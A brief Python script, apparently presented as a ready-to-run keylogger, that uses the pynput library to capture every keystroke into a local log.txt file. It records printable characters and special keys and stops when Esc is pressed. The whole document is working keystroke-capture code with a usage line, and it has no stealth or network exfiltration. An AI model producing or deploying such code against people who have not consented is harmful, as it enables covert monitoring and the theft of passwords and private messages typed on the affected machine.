# usage: 'python keylogger.py'
from pynput.keyboard import Key, Listener

def on_press(key):
    with open("log.txt", "a") as log:
        try:
            # Log printable characters
            log.write(f"{key.char}")
        except AttributeError:
            # Handle special keys (exclude Shift, Enter, Esc)
            if key == Key.space:
                log.write(" ")  # Add a space for the space key
            elif key in [Key.shift, Key.shift_r, Key.enter, Key.esc]:
                pass  # Do not log these keys
            else:
                log.write(f"[{key}]")  # Log other special keys in brackets

def on_release(key):
    # Stop the keylogger when the Esc key is pressed
    if key == Key.esc:
        return False

# Start listening to the keyboard
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
